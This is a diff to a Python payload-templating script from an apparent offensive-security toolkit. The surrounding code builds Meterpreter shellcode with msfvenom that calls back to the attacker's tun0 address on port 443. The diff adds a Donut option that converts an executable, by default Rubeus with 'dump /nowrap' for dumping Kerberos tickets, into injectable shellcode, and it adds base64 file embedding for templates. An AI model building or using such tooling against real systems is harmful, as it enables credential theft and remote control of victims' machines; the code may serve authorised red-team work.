@@ -3,6 +3,7 @@ import ep_gensc
 import ep_compile
 import importlib
 import subprocess
+import os
 
 def get_tun0_ip():
     try:
@@ -36,6 +37,17 @@ def Call_Msfvenom(plFormat):
         lport = "443"
     
     return ep_gensc.GetMetShellCode(payload, lhost, lport, plFormat)
+
+def Call_Donut():
+    inputFile = input("Enter the full path to target executable. Default value is [/home/kali/tools/rubeus.exe]")
+    if inputFile == "":
+        inputFile = "/home/kali/tools/rubeus.exe"
+    params = input("Enter the exe params looks like rubeus [params]. Default value is [dump /nowrap]")
+    if params == "":
+        params = "dump /nowrap"
+    return ep_gensc.GetDonutShellCode(inputFile,params)
+
+
 
 def FillTemplate(template):
     templateFileName = "templates/" + template + ".json"
@@ -79,6 +91,16 @@ def FillTemplate(template):
             if name in templateValues:
                 print("Error in json configuration duplicate configuration for a customAttribute or subCustomAttribute. Exiting.")
                 exit();
+            if "fileProcessor" in customAttribute:
+                if os.path.isfile(choice):
+                    print("The file exists.")
+                else:
+                    print("File to be processed not found exiting.")
+                    exit();
+                if customAttribute["fileProcessor"] == "b64File":
+                    result = subprocess.run(['base64', '-w 0', choice], capture_output=True, text=True)
+                    choice = result.stdout
+            
             templateValues[f"{name}"] = choice
 
     if "subCustomAttributes" in template:
@@ -117,6 +139,8 @@ def FillTemplate(template):
                 profileName = templateValues["profileName"]
                 print("This needs to be rewritten see line 126 of ep_templater")
                 #shellCode = ep_gensc.GetSliverShellCode(payload, lhost, lport, plFormat, profileProtocol, profileArchitecture, profileName)
+            elif templateValues["shellCodeType"] == "donut":
+                shellCode = Call_Donut()
             else: 
                 print("Unrecognised [shellCodeType]. Exiting")
                 exit();
